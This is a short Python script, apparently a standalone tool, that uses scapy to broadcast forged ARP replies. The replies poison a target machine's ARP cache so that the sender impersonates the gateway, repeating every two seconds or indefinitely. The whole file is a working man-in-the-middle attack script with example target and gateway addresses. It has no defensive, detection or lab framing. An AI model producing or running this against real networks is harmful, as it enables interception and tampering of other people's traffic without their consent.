# arp_spoofing.py

from scapy.all import ARP, Ether, sendp
import time

def send_arp_spoof(target_ip, target_mac, spoof_ip, interval=2, count=100):
    """
    Sends ARP spoofing packets to the target IP address pretending to be the spoof IP.
    
    Parameters:
    - target_ip: IP address of the target machine to spoof
    - target_mac: MAC address of the target machine
    - spoof_ip: IP address to spoof (usually the gateway/router)
    - interval: Interval in seconds between each ARP spoofing attempt
    - count: Number of spoofing attempts (use 0 for infinite)

    """
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")

    if count == 0:
        # Send packets indefinitely
        while True:
            sendp(ether/arp, verbose=0)
            time.sleep(interval)
    else:
        # Send packets for count times
        for _ in range(count):
            sendp(ether/arp, verbose=0)
            time.sleep(interval)

if __name__ == "__main__":
    # Example usage
    target_ip = "192.168.1.100"
    target_mac = "00:11:22:33:44:55"  # Target device MAC address
    gateway_ip = "192.168.1.1"        # IP of the gateway or router

    send_arp_spoof(target_ip, target_mac, gateway_ip)
